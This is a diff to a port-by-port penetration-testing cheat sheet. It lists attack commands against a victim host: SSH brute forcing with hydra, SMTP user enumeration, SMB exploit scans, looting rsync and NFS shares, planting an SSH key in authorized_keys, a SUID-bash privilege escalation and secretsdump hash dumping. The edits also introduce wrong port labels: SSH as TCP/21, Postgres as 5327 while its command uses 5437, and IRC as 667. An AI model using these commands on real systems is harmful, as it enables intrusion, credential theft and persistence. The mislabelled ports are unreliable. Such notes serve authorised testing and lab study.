@@ -4,9 +4,7 @@
 
 ## **Ports**
 
-### **FTP**
-
-TCP port 21
+### TCP/21 - **FTP**
 
 Login (try using anonymous:anonymous, anonymous:password, guest:guest, etc.).
 
@@ -63,17 +61,15 @@ End a FTP session.
 exit
 ```
 
-### **SSH**
+### **TCP/21 - SSH**
 
-TCP port 22
+
 
 ```
 hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
 ```
 
-### **SMTP**
-
-TCP port 25.
+### **TCP/25 - SMTP**
 
 ```
 telnet $VICTIM25
@@ -98,9 +94,7 @@ smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $VIC
 sudo nmap $VICTIM -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-vuln
 ```
 
-### **HTTP(s)**
-
-HTTP TCP port 80 / HTTP TCP 443
+### **TCP/80:443 - HTTP(s)**
 
 Add things from this room: [https://tryhackme.com/room/contentdiscovery](https://tryhackme.com/room/contentdiscovery)
 
@@ -174,9 +168,7 @@ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Cr
 
 
 
-### Kerberos
-
-UDP/TCP port 88
+### UDP/88 - Kerberos
 
 #### Username Enumeration
 
@@ -184,9 +176,7 @@ UDP/TCP port 88
 kerbrute/dist/kerbrute_linux_386 userenum --dc=$VICTIM -d=$commonName $ListOfUsernames.txt
 ```
 
-### **POP3**
-
-TCP port 110
+### **TCP/110 - POP3**
 
 ```
 telnet $VICTIM 110
@@ -196,9 +186,7 @@ RETR 1
 QUIT
 ```
 
-### **RPC**
-
-TCP port 135
+### **TCP/135 - RPC**
 
 ```
 rpcclient -U '' $VICTIM
@@ -206,20 +194,16 @@ srvinfo
 netshareenum # print the real file-path of shares; good for accurate RCE
 ```
 
-### **NetBIOS**
-
-TCP port 139
+### **TCP/139 - NetBIOS**
 
 ```
 nbtscan $VICTIM
 enum4linux $VICTIM
 ```
 
-###
 
-### **SMB**
 
-TCP port 445
+### **TCP/445  - SMB**
 
 ```
 smbclient -L //$VICTIM/ # list shares
@@ -260,23 +244,39 @@ sudo nmap $VICTIM -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-
 sudo nmap $VICTIM -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494
 ```
 
-### **Rsync**
-
-TCP port 873
+### **TCP/873 - RSYNC**
 
 ```
-sudo nmap $VICTIM-p873 --script rsync-list-modules
+sudo nmap $VICTIM -p873 --script rsync-list-modules
 rsync -av rsync://$VICTIM/$SHARE --list-only
 rsync -av rsync://$VICTIM/$SHARE loot
 ```
 
-### **NFS**
+### **TCP/2049 - NFS**
 
-TCP port 2049
+<pre><code><strong>sudo nmap $VICTIM -p111 --script-nfs*
+</strong></code></pre>
 
-<pre><code><strong>sudo nmap $VICTIM-p111 --script-nfs*
-</strong>showmount -e $VICTIM
-</code></pre>
+```
+#This will list some folders hopefully
+showmount -e $VICTIM
+#Make a dir
+mkdir /mnt/nfs
+#/opt/conf is just an example, put what came out after showmount
+mount $VICTIM:/opt/conf /mnt/nfs
+cd /mnt/nfs
+```
+
+**Upload ID\_RSA key to login**
+
+```
+ssh-keygen -t rsa
+cp ~/.ssh/id_rsa.pub authorized_keys
+rsync authorized_keys rsync://rsync-connect@$VICTIM/files/sys-internal/.ssh
+Password: pass
+
+ssh $USERNAME@$VICTIM
+```
 
 **Create mount**
 
@@ -308,38 +308,30 @@ chmod +d /mount/point/bash
 /mount/point/bash -p
 ```
 
-### **SQL**
-
-TCP port 3306
+### **TCP/3306 - SQL**
 
 ```
 mysql -u $USER -h $VICTIM
 ```
 
-### **RDP**
-
-TCP port 3389
+### **TCP/3389 - RDP**
 
 ```
-sudo nmap $VICTIM -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-scripts-rdp-ntlm-info
+sudo nmap $VICTIM -p3389 --script rdp-ntlm-info 
 ```
 
 ```
 rdesktop -u administrator $VICTIM
 ```
 
-### **Postgres**
-
-TCP port 5437
+### **TCP/5327 - Postgres**
 
 ```
 psql -U postgres -p 5437 -h $VICTIM # postgres:postgres
 SELECT pg_ls_dir('/');
 ```
 
-### **WinRM**
-
-TCP port 5985
+### **TCP/5985 - WinRM**
 
 Login with found username and password
 
@@ -359,9 +351,7 @@ Dump hashes of other users if the user you have access to has the privilege's to
 python3 secretsdump.py  $DOMAIN/$USERNAME:$PASSWORD@$VICTIM
 ```
 
-### **IRC**
-
-TCP port 6667
+### **TCP/667 - IRC**
 
 ```
 irssi -c $VICTIM -p $PORT
